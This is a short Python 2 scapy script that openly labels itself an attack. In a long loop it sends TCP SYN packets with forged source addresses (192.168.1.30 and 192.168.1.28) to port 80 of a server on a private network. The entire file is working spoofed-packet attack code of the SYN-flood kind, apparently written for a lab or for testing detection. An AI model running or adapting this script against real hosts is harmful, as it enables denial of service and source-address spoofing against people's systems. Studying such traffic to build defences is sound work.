from scapy.all import *
import atexit

import threading
from threading import Thread
import time


SERVER_IP = "192.168.1.113"
SERVER_PORT = 80


counter = 0
seq = 1000
sport = 49173


# here is a basic attack made by two ips

s = conf.L3socket(iface='enp0s3')
for i in range(1, 99999):

	print "Attack #" +str(i)
	
	stringIp = "192.168.1.30"
	ip = IP(src=stringIp, dst=SERVER_IP)
	syn = TCP(sport=sport, dport=SERVER_PORT, flags='S', seq=seq)
	packet = ip/syn
	s.send(packet)
	
	stringIp = "192.168.1.28"
	ip = IP(src=stringIp, dst=SERVER_IP)
	syn = TCP(sport=sport, dport=SERVER_PORT, flags='S', seq=seq)
	packet = ip/syn
	s.send(packet)
	
	time.sleep(0.4)
		
		



	
	
	
		
